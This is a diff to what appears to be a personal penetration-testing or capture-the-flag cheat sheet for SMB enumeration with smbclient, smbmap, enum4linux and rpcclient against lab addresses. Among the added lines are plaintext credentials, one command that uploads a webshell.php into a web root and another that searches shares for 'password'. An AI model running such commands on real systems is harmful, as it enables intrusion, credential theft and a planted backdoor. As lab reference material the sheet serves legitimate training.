@@ -4,11 +4,17 @@ smbclient \\\\10.10.218.140\\anonymous -N
 
 # smbmap
 smbmap -H 10.10.218.140
+smbmap -H 10.10.22.36 -u Bill -p Juw4nnaM4n420696969clear$$
+./smbmap.py -H iP -u ‘jsmith’ -p ‘Spring!2020’ -q -R –depth 2 –exclude ADMIN$ IPC$ #q=quiet, R=recursive
+./smbmap.py -H 192.168.86.20 -u ‘administrator’ -p ‘asdf1234’ -upload websell.php ‘htdocs\webshell.php’
+./smbmap.py -H IP -u administrator -p asdf1234 -F password #F:regular expresion a buscar
 
 # enum4linux
 enum4linux 10.10.20.192 -a
+enum4linux -u Bill -p 'Juw4nnaM4n420696969!$$$' -a 10.10.22.36
 
 # rpcclient
+rpcclient -U 'Bill' 10.10.22.36
 rpcclient -U "" -N IP
 >enumdomusers
 >queryuser 0x3e8
